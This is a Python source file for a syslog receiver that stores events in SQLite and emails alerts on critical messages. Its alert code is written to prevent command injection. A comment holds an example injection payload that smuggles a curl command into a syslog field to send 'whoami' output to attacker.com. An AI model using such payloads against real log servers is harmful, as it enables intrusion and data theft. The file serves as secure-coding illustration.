import socket
import sqlite3
import re
import subprocess
import logging
import threading
import time
from datetime import datetime

# Configure logging for the Centralized Syslog Monitor
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - SyslogAggregator - %(levelname)s - %(message)s'
)
logger = logging.getLogger("SyslogMonitor")

DB_FILE = "syslog_events.db"
UDP_IP = "0.0.0.0"
UDP_PORT = 514

def init_syslog_db():
    """Initializes the SQLite database to store aggregated syslog events."""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS event_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            received_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            source_ip TEXT NOT NULL,
            facility_priority TEXT,
            hostname TEXT,
            app_name TEXT,
            message TEXT
        )
    ''')
    
    conn.commit()
    conn.close()
    logger.info("Syslog event database initialized.")

def store_event(source_ip: str, pri: str, host: str, app: str, msg: str):
    """Saves parsed syslog events to the local database."""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO event_logs (source_ip, facility_priority, hostname, app_name, message) VALUES (?, ?, ?, ?, ?)",
            (source_ip, pri, host, app, msg)
        )
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        logger.error(f"Database error writing syslog event: {e}")

def trigger_critical_alert(hostname: str, app_name: str, message: str):
    """
    SECURE: Uses stdin for data piping and shell=False to prevent Command Injection.
    """
    logger.warning(f"CRITICAL EVENT DETECTED from {hostname}. Triggering alert system.")
    
    # Secure: The command and its arguments are defined as a list.
    # We avoid the shell pipe (|) and 'echo' entirely. The command execution
    # is separated from the untrusted data.
    alert_command = [
        "mail",
        "-s", "URGENT: Syslog Alert",
        "soc-team@internal.local"
    ]
    
    # The message body containing the untrusted syslog fields
    alert_body = f"CRITICAL ALERT: [Host: {hostname}] [App: {app_name}] - {message}\n"
    
    try:
        logger.debug(f"Executing secure alert command: {alert_command}")
        
        process = subprocess.Popen(
            alert_command,
            shell=False,  # Explicitly disabled for security
            stdin=subprocess.PIPE, # Open stdin to pipe the data securely
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        # Pass the untrusted string securely via standard input (stdin)
        stdout, stderr = process.communicate(input=alert_body, timeout=10)
        
        if process.returncode == 0:
            logger.info("Alert email successfully dispatched to SOC team.")
        else:
            # Masking raw stderr to prevent leaking system information
            logger.error("Failed to dispatch alert email. Mail command encountered an error.")
            
    except subprocess.TimeoutExpired:
        logger.error("Alert generation script timed out.")
    except FileNotFoundError as e:
        logger.error(f"Mail utility not found: {e}")
    except Exception as e:
        logger.error(f"System error during alert generation: {e}")

def parse_syslog_packet(data: bytes, source_ip: str):
    """Parses standard RFC 3164/5424 syslog messages and checks for critical alerts."""
    try:
        raw_msg = data.decode('utf-8', errors='ignore').strip()
        
        # Basic Regex to extract Syslog components: <PRI> TIMESTAMP HOSTNAME APP_NAME: MESSAGE
        # Example: <34>Oct 11 22:14:15 mymachine su: 'su root' failed for lonvick on /dev/pts/8
        syslog_regex = r'<(\d+)>(?:[a-zA-Z]{3}\s+\d+\s+\d+:\d+:\d+\s+)?([\w\.\-]+)\s+([\w\.\-]+)(?:\[\d+\])?:\s+(.*)'
        match = re.match(syslog_regex, raw_msg)
        
        if match:
            pri, host, app, msg = match.groups()
            
            # Store everything for auditing
            store_event(source_ip, pri, host, app, msg)
            
            # Application Logic: If the message contains 'CRITICAL' or 'FATAL', trigger the alert script
            if "CRITICAL" in msg.upper() or "FATAL" in msg.upper():
                trigger_critical_alert(host, app, msg)
        else:
            # Fallback for malformed packets
            store_event(source_ip, "UNKNOWN", "UNKNOWN", "UNKNOWN", raw_msg)
            
    except Exception as e:
        logger.error(f"Error processing syslog packet from {source_ip}: {e}")

def start_syslog_receiver():
    """Starts a UDP listener mimicking a standard Syslog daemon (port 514)."""
    init_syslog_db()
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((UDP_IP, UDP_PORT))
    
    logger.info(f"Syslog Aggregator listening on UDP {UDP_IP}:{UDP_PORT}")
    
    # Example Malicious Payload via netcat (nc -u 127.0.0.1 514):
    # <13>Oct 11 22:14:15 pwned-host evil-app': CRITICAL ERROR; curl http://attacker.com/leak?data=$(whoami); #
    
    try:
        while True:
            data, addr = sock.recvfrom(2048)
            source_ip = addr[0]
            
            # Process packets asynchronously to avoid blocking the UDP receiver loop
            thread = threading.Thread(target=parse_syslog_packet, args=(data, source_ip))
            thread.daemon = True
            thread.start()
            
    except KeyboardInterrupt:
        logger.info("Shutting down Syslog Aggregator.")
    finally:
        sock.close()

if __name__ == "__main__":
    start_syslog_receiver()
